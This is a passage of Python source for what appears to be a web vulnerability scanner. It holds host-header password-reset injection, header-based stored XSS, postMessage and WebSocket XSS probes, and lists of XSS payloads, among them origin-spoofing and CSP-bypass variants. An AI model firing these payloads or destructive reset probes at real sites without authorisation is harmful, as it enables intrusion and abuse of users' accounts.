                allow_redirects=False,
            )
        except _NET_EXCEPTIONS:
            continue

        # Kontroluj response
        if r.status_code not in (200, 201, 202, 302, 303):
            continue

        # Hledat evil_host v response (jestli server echoval Host)
        body_text = ""
        try:
            body_text = r.text[:200000]
        except Exception:
            pass

        body_hit = evil_host in body_text
        # Některé apps potvrdí email odeslání v body
        confirm_words = ("email", "sent", "check your", "instructions",
                         "odesláno", "potvrzení")
        likely_email_sent = any(w in body_text.lower() for w in confirm_words)

        if not (body_hit or likely_email_sent):
            continue

        severity = "high"
        if body_hit:
            severity = "critical"
            description = (
                f"Host Header injection CONFIRMED at {endpoint}. "
                f"Server echoed evil host '{evil_host}' in response. "
                f"Password reset email to '{test_email}' may contain "
                f"attacker-controlled link. CHECK YOUR INBOX.")
        else:
            description = (
                f"Possible Host Header injection at {endpoint}. "
                f"Server accepted POST with evil Host and returned "
                f"email-sent confirmation. VERIFY {test_email} inbox "
                f"for reset link with attacker host.")

        finding = {
            "kind": "host-header-reset",
            "url": endpoint,
            "evil_host": evil_host,
            "test_email": test_email,
            "body_hit": body_hit,
            "response_status": r.status_code,
            "severity": severity,
            "cwe": "CWE-20",  # Improper Input Validation
            "description": description,
            "destructive": True,
        }
        findings.append(finding)

        if on_log:
            try:
                on_log(
                    f"[DESTRUCTIVE/hosthdr] {severity.upper()} — "
                    f"reset triggered at {endpoint}. CHECK INBOX: "
                    f"{test_email}",
                    "error",
                )
            except Exception:
                pass

        # Po prvním hitu stop (žádný spam reset endpointu)
        break

    return findings


# Stored XSS via headers
_STORED_HEADER_XSS_PAYLOADS = [
    '"><script>alert(/XSGS-stored-hdr/)</script>',
    "javascript:alert('XSGS-stored-hdr')",
    "<img src=x onerror=alert('XSGS-stored-hdr')>",
]

_STORED_HEADER_VECTORS = [
    "Referer",
    "User-Agent",
    "X-Forwarded-For",
    "Via",
    "From",
    "Client-IP",
    "True-Client-IP",
]


def _pp_chain_has_verified_edge(src, gadget) -> bool:
    """v10.18 (FP#1 confirmation gate): rozhodne, jestli mezi pollution
    SOURCE a gadget READ existuje plausibilní def-use hrana, nebo jde jen
    o KO-LOKACI (oba ve stejném souboru, ale bez datového toku).

    Konzervativní heuristika (bez plného inter-procedural taintu):
      - Source MUSÍ mít původ v user-inputu (arg_origin == 'user-input').
        Merge/set bez user-controlled argumentu nepolluteuje útočníkem.
      - Source a gadget musí být ve stejném souboru.
      - Gadget read musí být DOSAŽITELNÝ po source zápisu (stejný soubor;
        u inline scriptu bereme line-order jako slabý signál toku).
      - Gadget kind musí být skutečný HTML/JS sink (ne config/url-sink, který
        sám o sobě nespouští skript).

    Když kterákoli podmínka selže → NEověřeno → finding degraduje na INFO.
    Ověřeno (True) ⇒ HIGH/MEDIUM jen pro reálné, útočníkem dosažitelné chainy.
    """
    try:
        # 1) Source musí být user-controlled.
        if getattr(src, "arg_origin", "") != "user-input":
            return False
        # 2) Stejný soubor (cross-file chain bez importní analýzy = neověřitelný).
        if getattr(src, "file", None) != getattr(gadget, "file", None):
            return False
        # 3) Gadget musí být reálný spustitelný sink.
        gk = (getattr(gadget, "sink_kind", "") or "").lower()
        if "html-sink" not in gk and "eval" not in gk and "cve" not in gk:
            return False
        # 4) Gadget confidence ne-triviální.
        if getattr(gadget, "confidence", 0.0) < 0.5:
            return False
        # 5) Slabý line-order signál: gadget čtení po source zápisu (nebo
        #    blízko). Když je gadget DALEKO před source, tok je nepravděpodobný.
        s_line = getattr(src, "line", 0) or 0
        g_line = getattr(gadget, "line", 0) or 0
        if s_line and g_line and g_line < s_line - 50:
            return False
        return True
    except Exception:
        return False


def stored_xss_headers_scan(session: requests.Session,
                              url: str,
                              timeout: float = 8.0,
                              on_log: Optional[Callable] = None) -> List[Dict]:
    """[DESTRUCTIVE] Test Stored XSS via custom request headers.

    v10.18 (FP#2 fix): dříve se hlásil HIGH nález jen na základě toho, že se
    payloady ODESLALY — bez ověření, že se hodnota hlavičky někde reflektuje.
    Na stránce nasycené payload-tvary jako inertním textem (např. tx-core.com,
    kde jsou <script>…</script> ukázky v <code>) to dělalo false-positivy:
    modul matchoval TVAR payloadu, ne svůj unikátní marker.

    Nová strategie — "nehádá, prokazuje":
      1. Do každého payloadu vloží UNIKÁTNÍ vysoko-entropní nonce per injekci.
      2. Po injekci znovu načte stránku a hledá PŘESNĚ ten nonce.
      3. Reflektovaný nonce klasifikuje kontextem — XSS jen když padne do
         spustitelné pozice (raw HTML / unquoted atribut / <script>), ne do
         textu, <code>/<pre> nebo escapované (&lt;).
      4. Bez reflexe → INFO "submitted, manual verify" (logy nelze ověřit z
         client-side). S reflexí v inertním kontextu → INFO. Jen reflexe ve
         spustitelném kontextu → HIGH (confirmed).
    """
    findings: List[Dict] = []

    try:
        parsed = urlparse(url)
    except Exception:
        return findings

    payloads_submitted = 0
    confirmed: List[Dict] = []   # reflektované ve spustitelném kontextu
    reflected_inert = 0          # reflektované, ale neškodný kontext

    for header_name in _STORED_HEADER_VECTORS:
        for payload_tmpl in _STORED_HEADER_XSS_PAYLOADS:
            # Unikátní nonce per injekci — vysoká entropie, nekoliduje s
            # dokumentovanými payloady na stránce.
            nonce = "XSGSn" + random_marker(14)
            # Nahraď statický marker v payloadu unikátním nonce.
            payload = payload_tmpl.replace("XSGS-stored-hdr", nonce)
            try:
                r = session.get(
                    url,
                    headers={header_name: payload},
                    timeout=timeout,
                    allow_redirects=False,
                )
                payloads_submitted += 1
            except _NET_EXCEPTIONS:
                continue
            except (ValueError, OSError):
                continue

            if r is None:
                continue

            body = ""
            try:
                body = r.text or ""
            except (ValueError, OSError):
                continue

            # KROK 2: hledej PŘESNĚ ten nonce. Žádný nonce → žádná reflexe.
            if nonce not in body:
                continue

            # KROK 3: klasifikuj kontext reflektovaného nonce.
            ctx = None
            try:
                ctx = _classify_reflection_ctx(body, payload, nonce)
            except Exception:
                ctx = None
            executable = _ctx_is_executable(ctx, body, nonce)

            if executable:
                confirmed.append({
                    "header": header_name,
                    "nonce": nonce,
                    "context": ctx or "raw",
                    "payload": payload[:80],
                })
            else:
                reflected_inert += 1

    # ── Vyhodnocení ────────────────────────────────────────────────────────
    if confirmed:
        # POTVRZENO: nonce reflektovaný ve spustitelném kontextu = reálný XSS.
        findings.append({
            "kind": "stored-xss-headers",
            "url": url,
            "severity": "high",
            "cwe": "CWE-79",
            "confirmed": True,
            "affected_headers": [c["header"] for c in confirmed],
            "context": confirmed[0]["context"],
            "evidence_nonce": confirmed[0]["nonce"],
            "description": (
                f"CONFIRMED stored/reflected XSS via request header "
                f"'{confirmed[0]['header']}': a unique nonce injected through "
                f"the header was reflected into an executable context "
                f"({confirmed[0]['context']}) in the response body."
            ),
            "destructive": True,
            "verification_required": False,
        })
        if on_log:
            try:
                on_log(
                    f"[DESTRUCTIVE/storedhdr] CONFIRMED — nonce reflected in "
                    f"executable context via {confirmed[0]['header']}.", "error")
            except Exception:
                pass
    elif reflected_inert > 0:
        # Nonce se reflektoval, ale jen v neškodném kontextu (text/code/escaped).
        findings.append({
            "kind": "stored-xss-headers",
            "url": url,
            "severity": "info",
            "cwe": "CWE-79",
            "confirmed": False,
            "description": (
                f"Header value reflected in a non-executable context "
                f"({reflected_inert} reflection(s) in text/code/escaped "
                f"position). Not exploitable as XSS — informational only."
            ),
            "destructive": True,
            "verification_required": True,
        })
        if on_log:
            try:
                on_log(
                    f"[DESTRUCTIVE/storedhdr] Header reflected but inert "
                    f"({reflected_inert}) — INFO, not XSS.", "info")
            except Exception:
                pass
    elif payloads_submitted > 0:
        # Žádná reflexe — možný blind stored XSS (logy/admin panel). Submitted
        # only → INFO, vyžaduje manuální ověření, NIKDY ne MEDIUM/HIGH.
        findings.append({
            "kind": "stored-xss-headers",
            "url": url,
            "severity": "info",
            "cwe": "CWE-79",
            "confirmed": False,
            "payloads_submitted": payloads_submitted,
            "headers_tested": _STORED_HEADER_VECTORS,
            "description": (
                f"Submitted {payloads_submitted} payloads via "
                f"{len(_STORED_HEADER_VECTORS)} headers; no reflection observed "
                f"in the response. If headers are logged (analytics, audit, "
                f"admin panels) a blind stored XSS may still be possible — "
                f"MANUAL VERIFICATION required. Reported as INFO (unconfirmed)."
            ),
            "destructive": True,
            "verification_required": True,
        })
        if on_log:
            try:
                on_log(
                    f"[DESTRUCTIVE/storedhdr] Submitted {payloads_submitted} "
                    f"payloads, no reflection — INFO (manual verify logs).",
                    "info")
            except Exception:
                pass

    return findings


def _classify_reflection_ctx(body: str, payload: str, nonce: str):
    """Wrapper kolem context_engine klasifikace; vrátí legacy string kontext
    nebo None. Izolováno kvůli volitelnému importu."""
    try:
        from context_engine import classify_reflection_context_v2 as _cls
        return _cls(body, payload, nonce)
    except Exception:
        return None


def _ctx_is_executable(ctx, body: str, nonce: str) -> bool:
    """True jen když je reflektovaný nonce ve spustitelné pozici.

    Spustitelné: script_body, html_tag/tag_injection, unquoted/attr breakout,
    event handler, javascript: URL. NEspustitelné: html_escaped, html_text,
    uvnitř <code>/<pre>/rawtext, komentář.

    POŘADÍ JE KLÍČOVÉ: nejdřív kontrolujeme INERTNÍ KONTEJNERY (escaped, <code>,
    <pre>, rawtext), protože ty potlačí spuštění bez ohledu na to, jak payload
    vypadá. Až potom věříme verdiktu kontextového enginu. (Bez tohohle pořadí
    by <code>"><script>…</code> hlásilo script_body = false-positive.)
    """
    idx = body.find(nonce)
    if idx == -1:
        return False

    # ── INERTNÍ KONTEJNERY (priorita) ──────────────────────────────────────
    # 1) Escapované okolí. Dvě varianty:
    #    (a) escaped entita TĚSNĚ u nonce a žádný reálný '<'/'>' vedle, nebo
    #    (b) nonce je UVNITŘ escapovaného tagu: před ním je &lt; a za ním &gt;
    #        bez reálného tagu mezi tím (payload byl HTML-escapovaný celý).
    tight_before = body[max(0, idx - 12): idx]
    tight_after = body[idx + len(nonce): idx + len(nonce) + 12]
    tight = tight_before + tight_after
    if ("&lt;" in tight or "&gt;" in tight or "&amp;" in tight) and \
       ("<" not in tight and ">" not in tight):
        return False
    # (b) širší kontrola: hledej nejbližší tag-boundary kolem nonce. Pokud je
    #     payload escapovaný, nejbližší '<' před nonce je ve skutečnosti '&lt;'
    #     (a podobně za ním '&gt;'). Vezmi okno a porovnej, jestli boundaries
    #     jsou escaped nebo reálné.
    seg_before = body[max(0, idx - 200): idx]
    seg_after = body[idx + len(nonce): idx + len(nonce) + 200]
    # poslední tag-otevírací znak před nonce: reálný '<' vs escaped '&lt;'
    real_lt_pos = seg_before.rfind("<")
    esc_lt_pos = seg_before.rfind("&lt;")
    # první uzavírací za nonce
    real_gt_pos = seg_after.find(">")
    esc_gt_pos = seg_after.find("&gt;")
    # Pokud je nejbližší "tag start" před nonce escapovaný (&lt; blíž než reálný
    # '<', nebo reálný '<' vůbec není) → nonce je v escapovaném/textovém obsahu.
    before_is_escaped = (esc_lt_pos != -1 and esc_lt_pos >= real_lt_pos)
    # a current real '<' (pokud je) patří k legitimní struktuře stránky, ne k payloadu
    if before_is_escaped:
        return False
    window = body[max(0, idx - 120): idx + len(nonce) + 120]
    # 2) Uvnitř rawtext/inertního elementu (<code>/<pre>/<textarea>/<title>/<xmp>):
    #    najdi poslední otevírací tag před nonce; pokud není uzavřený, nonce je
    #    uvnitř → prohlížeč obsah nerendruje jako HTML.
    pre = body[:idx].lower()
    for tag in ("code", "pre", "textarea", "title", "xmp", "script"):
        last_open = pre.rfind(f"<{tag}")
        last_close = pre.rfind(f"</{tag}>")
        if last_open != -1 and last_open > last_close:
            # uvnitř <code>/<pre>/… → inert (i kdyby uvnitř byl <script> text);
            # výjimka: uvnitř reálného <script> elementu JE spustitelné
            if tag == "script":
                return True
            return False

    # ── KONTEXTOVÝ ENGINE (až po inertních kontejnerech) ───────────────────
    if ctx:
        cl = str(ctx).lower()
        if any(x in cl for x in ("escaped", "text", "comment", "none", "unknown")):
            return False
        if any(x in cl for x in ("script", "tag_injection", "html_tag",
                                 "unquoted", "event", "javascript", "code_exec",
                                 "attr_break")):
            return True

    # ── Konzervativní heuristika (fallback bez engine verdiktu) ────────────
    # Spustitelné jen když nonce SOUSEDÍ s nereálným '<' tvořícím tag — tj.
    # payload reálně rozbil markup. Pouhý '<' poblíž (z <div>/<html> struktury
    # stránky) NESTAČÍ. Kontrolujeme znaky bezprostředně lemující nonce.
    lead = body[max(0, idx - 2): idx]            # 2 znaky před
    trail = body[idx + len(nonce): idx + len(nonce) + 2]  # 2 znaky za
    # reálný '<' nebo '>' bezprostředně u nonce (ne escaped) → payload rozbil markup
    if ("<" in lead or ">" in lead or "<" in trail or ">" in trail):
        # a zároveň to není escaped entita hned vedle
        near = lead + trail
        if "&lt;" not in (body[max(0, idx - 6): idx] + body[idx + len(nonce): idx + len(nonce) + 6]):
            return True
    return False






def static_postmessage_scan(session: requests.Session,
                            html: str,
                            base_url: str,
                            timeout: float) -> List[Dict]:
    """
    Statická analýza postMessage handlerů v inline JS a externích skriptech.

    Hledá:
    1. addEventListener("message", handler)
    2. Sink uvnitř handleru (innerHTML, eval, jQuery, ...)
    3. Zda handler kontroluje event.origin (pokud ne → critical)

    Vrací:
        [{"where": str, "handler_snippet": str, "has_sink": bool,
          "sink_type": str, "origin_checked": bool, "severity": str}, ...]
    """
    findings: List[Dict] = []
    scripts = extract_scripts(html, base_url)

    # Signatury knihoven — skip false positives
    LIB_SIGNATURES = (
        "jQuery v", "jquery.org/license", "jquery.min",
        "Bootstrap v", "React v", "lodash", "angular",
        "Vue.js v", "Popper.js", "Chart.js",
    )

    for origin, content in scripts:
        code = content
        if code is None:
            code = fetch_external_script(session, origin, timeout)
        if not code:
            continue

        # Skip knihoven
        if len(code) > 50_000:
            header = code[:800]
            if any(sig in header for sig in LIB_SIGNATURES):
                continue

        # Najdi postMessage listenery
        for match in _POSTMESSAGE_LISTENER_RX.finditer(code):
            pos = match.start()
            # Extrahuj handler body — najdi otevírací { a matchuj closing }
            handler_start = code.find("{", pos)
            if handler_start == -1:
                # Arrow function bez {} — vezmi do konce řádku
                line_end = code.find("\n", pos)
                handler_body = code[pos:line_end if line_end != -1 else pos + 500]
            else:
                # Najdi matching } — jednoduchý brace counter (funguje pro většinu kódu)
                depth = 0
                end_pos = handler_start
                for i in range(handler_start, min(len(code), handler_start + 3000)):
                    if code[i] == "{":
                        depth += 1
                    elif code[i] == "}":
                        depth -= 1
                        if depth == 0:
                            end_pos = i + 1
                            break
                handler_body = code[handler_start:end_pos]

            # Hledej sinky v handleru
            sink_match = _POSTMESSAGE_SINK_RX.search(handler_body)
            has_sink = sink_match is not None
            sink_type = sink_match.group(0).strip() if sink_match else None

            # Kontrola origin validace
            origin_checked = bool(_ORIGIN_CHECK_RX.search(handler_body))

            # Severity
            if has_sink and not origin_checked:
                severity = "CRITICAL"
            elif has_sink and origin_checked:
                severity = "MEDIUM"  # origin check může být obejitelný
            elif not has_sink:
                severity = "LOW"     # listener bez sinkuu — informativní
            else:
                severity = "INFO"

            # Snippet kolem matche (±150 znaků)
            snippet_start = max(0, pos - 50)
            snippet_end = min(len(code), pos + 400)
            snippet = code[snippet_start:snippet_end]

            findings.append({
                "where":          origin,
                "handler_snippet": snippet[:500],
                "has_sink":       has_sink,
                "sink_type":      sink_type,
                "origin_checked": origin_checked,
                "severity":       severity,
                "source":         "postmessage-static",
            })

    return findings


# Playwright postMessage injection script — injektuje se do page context
_POSTMESSAGE_INJECT_SCRIPT = """
(marker) => {
    window.__pm_xss_detected__ = false;
    window.__pm_sinks_hit__ = [];

    // Hook sinky
    try {
        var origInnerHTML = Object.getOwnPropertyDescriptor(Element.prototype, 'innerHTML');
        if (origInnerHTML && origInnerHTML.set) {
            Object.defineProperty(Element.prototype, 'innerHTML', {
                set: function(v) {
                    if (String(v).indexOf(marker) !== -1) {
                        window.__pm_xss_detected__ = true;
                        window.__pm_sinks_hit__.push({sink: 'innerHTML', value: String(v).substring(0, 200)});
                    }
                    return origInnerHTML.set.call(this, v);
                },
                get: origInnerHTML.get,
                configurable: true
            });
        }
    } catch(e) {}

    // Hook eval
    try {
        var origEval = window.eval;
        window.eval = function(code) {
            if (String(code).indexOf(marker) !== -1) {
                window.__pm_xss_detected__ = true;
                window.__pm_sinks_hit__.push({sink: 'eval', value: String(code).substring(0, 200)});
            }
            return origEval.call(this, code);
        };
    } catch(e) {}

    // Hook document.write
    try {
        var origWrite = document.write;
        document.write = function(html) {
            if (String(html).indexOf(marker) !== -1) {
                window.__pm_xss_detected__ = true;
                window.__pm_sinks_hit__.push({sink: 'document.write', value: String(html).substring(0, 200)});
            }
            return origWrite.call(this, html);
        };
    } catch(e) {}

    // Hook jQuery .html() pokud existuje
    try {
        if (window.jQuery) {
            var origHtml = jQuery.fn.html;
            jQuery.fn.html = function(val) {
                if (val !== undefined && String(val).indexOf(marker) !== -1) {
                    window.__pm_xss_detected__ = true;
                    window.__pm_sinks_hit__.push({sink: 'jQuery.html', value: String(val).substring(0, 200)});
                }
                return origHtml.apply(this, arguments);
            };
        }
    } catch(e) {}
}
"""

# postMessage payloady — posíláme přes window.postMessage()
POSTMESSAGE_XSS_PAYLOADS = [
    # Jednoduché HTML injection
    '<img src=x onerror=alert("PM_XSS_{marker}")>',
    '<svg onload=alert("PM_XSS_{marker}")>',
    # Script tag
    '<script>alert("PM_XSS_{marker}")</script>',
    # JSON string s HTML (pro handlery které parsují JSON z message)
    '{{"type":"update","html":"<img src=x onerror=alert(\'PM_XSS_{marker}\')>"}}',
    '{{"action":"render","content":"<svg onload=alert(\'PM_XSS_{marker}\')>"}}',
    # Prostý string (pro handlery které dělají innerHTML = event.data)
    'PM_XSS_{marker}<img src=x onerror=alert(1)>',
    # URL payload (pro handlery které dělají location = event.data)
    'javascript:alert("PM_XSS_{marker}")',
    # v10.14: rozšířené postMessage payloady
    # eval-style (handlery které dělají eval(e.data.code))
    '{{"code":"alert(\'PM_XSS_{marker}\')"}}',
    '{{"task":"alert(\'PM_XSS_{marker}\')","fname":"x"}}',  # alf.nu pattern
    # Function constructor handler
    '{{"fn":"return alert(\'PM_XSS_{marker}\')"}}',
    # Origin spoofing — handlery které kontrolují substring (endsWith bypass)
    '{{"origin":"trusted.com.evil.com","data":"alert(\'PM_XSS_{marker}\')"}}',
    # Nested JSON s HTML (handlery které extract path)
    '{{"meta":{{"render":{{"html":"<img src=x onerror=alert(\'PM_XSS_{marker}\')>"}}}}}}',
    # Array data (handlery které forEach + innerHTML+=)
    '[{{"html":"<img src=x onerror=alert(\'PM_XSS_{marker}\')>"}}]',
    # base64-encoded HTML payload (handlery které atob+innerHTML)
    'PG1nIHNyYz14IG9uZXJyb3I9YWxlcnQoIlBNX1hTU197marker}ICk+',  # base64
    # iframe srcdoc (handlery které vytvoří iframe)
    '<iframe srcdoc="<img src=x onerror=alert(\'PM_XSS_{marker}\')>"></iframe>',
    # SVG s animate (CSP bypass scénáře)
    '<svg><animate onbegin=alert("PM_XSS_{marker}") attributeName=x>',
    # Style-based (handler dělá style.cssText = data)
    '"; background:url("javascript:alert(\'PM_XSS_{marker}\')")',
]


def dynamic_postmessage_scan(url: str,
                             wait_secs: float = 2.0,
                             timeout_secs: float = 15.0) -> List[Dict]:
    """
    Dynamická postMessage XSS validace přes Playwright.

    1. Otevře stránku v Chromium
    2. Nainstaluje sink hooky (innerHTML, eval, document.write, jQuery.html)
    3. Pošle sérii postMessage payloadů s markerem
    4. Kontroluje zda se marker dostal do sinku → potvrzení XSS

    Vrací:
        [{"payload": str, "triggered": bool, "sinks_hit": list,
          "marker": str, "source": "postmessage-dynamic"}, ...]
    """
    results: List[Dict] = []

    try:
        from playwright.sync_api import sync_playwright
    except ImportError:
        return [{"error": "Playwright is not installed", "source": "postmessage-dynamic"}]

    try:
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=True, args=[
                "--no-sandbox", "--disable-gpu",
                "--disable-web-security",  # umožní cross-origin postMessage
            ])
            page = browser.new_page()

            try:
                page.goto(url, wait_until="domcontentloaded",
                          timeout=int(timeout_secs * 1000))
            except Exception:
                try:
                    page.wait_for_load_state("domcontentloaded", timeout=5000)
                except Exception:
                    pass

            marker = f"PMXSS_{random_marker(10)}"

            # Nainstaluj sink hooky
            page.evaluate(_POSTMESSAGE_INJECT_SCRIPT, marker)

            # Grace period — nech stránku inicializovat listenery
            page.wait_for_timeout(500)

            for tmpl in POSTMESSAGE_XSS_PAYLOADS:
                payload = tmpl.replace("{marker}", marker)

                # Reset detekce
                page.evaluate("() => { window.__pm_xss_detected__ = false; window.__pm_sinks_hit__ = []; }")

                # Pošli postMessage — simuluje útočníka z jiného okna
                page.evaluate(f"""
                    (msg) => {{
                        window.postMessage(msg, '*');
                    }}
                """, payload)

                # Čekej na zpracování
                page.wait_for_timeout(int(wait_secs * 300))

                # Vyhodnoť
                triggered = page.evaluate("() => window.__pm_xss_detected__") or False
                sinks = page.evaluate("() => window.__pm_sinks_hit__") or []

                results.append({
                    "payload":   payload,
                    "triggered": triggered,
                    "sinks_hit": sinks,
                    "marker":    marker,
                    "source":    "postmessage-dynamic",
                })

                if triggered:
                    break  # Nalezeno — nepotřebujeme další payloady

            browser.close()

    except Exception as e:
        results.append({
            "error":  f"{type(e).__name__}: {e}",
            "source": "postmessage-dynamic",
        })

    return results


# ══════════════════════════════════════════════════════════════════════════════
# ── WebSocket XSS SCANNER ──────────────────────────────────────────────────
# ══════════════════════════════════════════════════════════════════════════════
#
# Moderní SPA často komunikují přes WebSocket. Pokud server-side zpracuje
# WS message a reflektuje zpět (chat, live updates, notifications), a klient
# pak dělá innerHTML = wsMessage, je to DOM XSS přes WebSocket.
#
# Statická analýza: hledej ws.onmessage + sink, nebo addEventListener("message")
#                    na WebSocket objektu.
# Dynamická analýza: Playwright — interceptuj WS, pošli XSS payload, sleduj sinky.
# ══════════════════════════════════════════════════════════════════════════════

# Regex pro WebSocket konstrukci a message handlery
_WS_CONSTRUCTOR_RX = re.compile(
    r"""
    new\s+WebSocket\s*\(\s*     # new WebSocket(
    (['"`])                     # opening quote
    (wss?://[^'"`\s]+)          # ws:// nebo wss:// URL
    \1                          # closing quote
    """,
    re.VERBOSE | re.I
)

_WS_ONMESSAGE_RX = re.compile(
    r"""
    # v10.14 fix: regex nesmi matchnout window.addEventListener
    # — to je postMessage (resi _POSTMESSAGE_LISTENER_RX), ne WebSocket.
    # Pred .addEventListener / .onmessage musi byt receiver, ktery NENI
    # window|self|document|globalThis|top|parent (tj. nejaka WebSocket
    # instance, typicky 'ws', 'socket', 'conn' atd.).
    (?<!window)(?<!self)(?<!document)(?<!globalThis)(?<!top)(?<!parent)
    (?:
        \.onmessage\s*=\s*(?:function|async\s+function|\([^)]*\)\s*=>)|  # ws.onmessage = function/arrow
        \.addEventListener\s*\(\s*(['"])message\1\s*,                     # ws.addEventListener("message",
    )
    """,
    re.VERBOSE | re.I
)


def static_websocket_scan(session: requests.Session,
                          html: str,
                          base_url: str,
                          timeout: float) -> List[Dict]:
    """
    Statická analýza WebSocket XSS patterns v inline JS a externích skriptech.

    Hledá:
    1. new WebSocket(url) — endpoint discovery
    2. ws.onmessage handler nebo addEventListener("message") na WS
    3. Sink uvnitř message handleru (innerHTML, eval, jQuery, ...)

    Vrací:
        [{"where": str, "ws_url": str|None, "handler_snippet": str,
          "has_sink": bool, "sink_type": str, "severity": str}, ...]
    """
    findings: List[Dict] = []
    scripts = extract_scripts(html, base_url)

    LIB_SIGNATURES = (
        "jQuery v", "jquery.org/license", "React v", "lodash",
        "angular", "Vue.js v", "Popper.js", "Chart.js",
    )

    for origin, content in scripts:
        code = content
        if code is None:
            code = fetch_external_script(session, origin, timeout)
        if not code:
            continue

        if len(code) > 50_000:
            header = code[:800]
            if any(sig in header for sig in LIB_SIGNATURES):
                continue

        # Hledej WebSocket URL
        ws_urls = []
        for ws_match in _WS_CONSTRUCTOR_RX.finditer(code):
            ws_url = ws_match.group(2)
            ws_urls.append(ws_url)

        # Hledej onmessage handlery
        for msg_match in _WS_ONMESSAGE_RX.finditer(code):
            pos = msg_match.start()
            # Extrahuj handler body
            handler_start = code.find("{", pos)
            if handler_start == -1:
                handler_body = code[pos:min(len(code), pos + 500)]
            else:
                depth = 0
                end_pos = handler_start
                for i in range(handler_start, min(len(code), handler_start + 3000)):
                    if code[i] == "{":
                        depth += 1
                    elif code[i] == "}":
                        depth -= 1
                        if depth == 0:
                            end_pos = i + 1
                            break
                handler_body = code[handler_start:end_pos]

            # Hledej sinky v handleru
            sink_match = _POSTMESSAGE_SINK_RX.search(handler_body)
            has_sink = sink_match is not None
            sink_type = sink_match.group(0).strip() if sink_match else None

            # Severity
            if has_sink:
                severity = "HIGH"   # WS + sink = potenciální XSS
            else:
                severity = "INFO"   # WS handler bez sinku — informativní

            snippet_start = max(0, pos - 50)
            snippet_end = min(len(code), pos + 400)

            findings.append({
                "where":          origin,
                "ws_url":         ws_urls[0] if ws_urls else None,
                "ws_urls_found":  ws_urls,
                "handler_snippet": code[snippet_start:snippet_end][:500],
                "has_sink":       has_sink,
                "sink_type":      sink_type,
                "severity":       severity,
                "source":         "websocket-static",
            })

    return findings


# Playwright WS injection payloady
WEBSOCKET_XSS_PAYLOADS = [
    '<img src=x onerror=alert("WS_XSS_{marker}")>',
    '<svg onload=alert("WS_XSS_{marker}")>',
    '<script>alert("WS_XSS_{marker}")</script>',
    '{{"type":"message","content":"<img src=x onerror=alert(\'WS_XSS_{marker}\')>"}}',
    'WS_XSS_{marker}<img src=x onerror=alert(1)>',
]


def dynamic_websocket_scan(url: str,
                           ws_endpoints: List[str] = None,
                           wait_secs: float = 2.0,
                           timeout_secs: float = 20.0) -> List[Dict]:
    """
    Dynamická WebSocket XSS validace přes Playwright.

    1. Otevře stránku → interceptuje WS connections
    2. Pro každou WS connection pošle XSS payloady
    3. Monitoruje DOM sinky (innerHTML, eval, ...) přes hooky
    4. Pokud se marker dostane do sinku → potvrzení WS XSS

    Args:
        url: Cílová stránka (HTTP)
        ws_endpoints: Volitelné — WS URL z statické analýzy
        wait_secs: Čekání po každém payloadu
        timeout_secs: Celkový timeout

    Vrací:
        [{"ws_url": str, "payload": str, "triggered": bool,
          "sinks_hit": list, "source": "websocket-dynamic"}, ...]
    """
    results: List[Dict] = []

    try:
        from playwright.sync_api import sync_playwright
    except ImportError:
        return [{"error": "Playwright is not installed", "source": "websocket-dynamic"}]

    try:
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=True, args=[
                "--no-sandbox", "--disable-gpu",
            ])
            context = browser.new_context()
            page = context.new_page()

            # Sleduj WS connections
            ws_connections = []

            def on_ws(ws):
                ws_connections.append(ws)

            page.on("websocket", on_ws)

            marker = f"WSXSS_{random_marker(10)}"

            # Nainstaluj sink hooky přes CDP (addInitScript — před page load)
            page.add_init_script(f"""
                window.__ws_xss_detected__ = false;
                window.__ws_sinks_hit__ = [];
                var _ws_marker = {json.dumps(marker)};

                try {{
                    var _origInner = Object.getOwnPropertyDescriptor(Element.prototype, 'innerHTML');
                    if (_origInner && _origInner.set) {{
                        Object.defineProperty(Element.prototype, 'innerHTML', {{
                            set: function(v) {{
                                if (String(v).indexOf(_ws_marker) !== -1) {{
                                    window.__ws_xss_detected__ = true;
                                    window.__ws_sinks_hit__.push({{sink: 'innerHTML', value: String(v).substring(0, 200)}});
                                }}
                                return _origInner.set.call(this, v);
                            }},
                            get: _origInner.get,
                            configurable: true
                        }});
                    }}
                }} catch(e) {{}}

                try {{
                    var _origEval = window.eval;
                    window.eval = function(code) {{
                        if (String(code).indexOf(_ws_marker) !== -1) {{
                            window.__ws_xss_detected__ = true;
                            window.__ws_sinks_hit__.push({{sink: 'eval', value: String(code).substring(0, 200)}});
                        }}
                        return _origEval.call(this, code);
                    }};
                }} catch(e) {{}}

                try {{
                    var _origWrite = document.write;
                    document.write = function(html) {{
                        if (String(html).indexOf(_ws_marker) !== -1) {{
                            window.__ws_xss_detected__ = true;
                            window.__ws_sinks_hit__.push({{sink: 'document.write', value: String(html).substring(0, 200)}});
                        }}
                        return _origWrite.call(this, html);
                    }};
                }} catch(e) {{}}
            """)

            # Načti stránku
            try:
                page.goto(url, wait_until="domcontentloaded",
                          timeout=int(timeout_secs * 1000))
            except Exception:
                try:
                    page.wait_for_load_state("domcontentloaded", timeout=5000)
                except Exception:
                    pass

            # Čekej na WS connections
            page.wait_for_timeout(3000)

            if not ws_connections:
                results.append({
                    "info":   "No WebSocket connection detected on the page",
                    "source": "websocket-dynamic",
                })
                browser.close()
                return results

            # Pro každou WS connection posíláme payloady server→client
            # Playwright nemůže přímo posílat WS frames ze strany serveru,
            # ale můžeme simulovat zpracování WS dat přes JS injection.
            for ws in ws_connections:
                ws_url_str = ws.url if hasattr(ws, 'url') else "unknown"

                for tmpl in WEBSOCKET_XSS_PAYLOADS:
                    payload = tmpl.replace("{marker}", marker)

                    # Reset detekce
                    page.evaluate("""
                        () => {
                            window.__ws_xss_detected__ = false;
                            window.__ws_sinks_hit__ = [];
                        }
                    """)

                    # Simulace příjmu WS zprávy — dispatchujeme MessageEvent
                    # na všech aktivních WS handlerech. Toto simuluje situaci
                    # kdy útočník kontroluje server-side a posílá XSS payload.
                    page.evaluate(f"""
                        (msg) => {{
                            // Dispatch na všechny ws.onmessage a addEventListener handlery
                            try {{
                                var fakeEvent = new MessageEvent('message', {{
                                    data: msg,
                                    origin: window.location.origin
                                }});
                                // Broadcast — pokud existují globální handlery
                                window.dispatchEvent(fakeEvent);
                            }} catch(e) {{}}
                        }}
                    """, payload)

                    page.wait_for_timeout(int(wait_secs * 500))

                    triggered = page.evaluate("() => window.__ws_xss_detected__") or False
                    sinks = page.evaluate("() => window.__ws_sinks_hit__") or []

                    results.append({
                        "ws_url":    ws_url_str,
                        "payload":   payload,
                        "triggered": triggered,
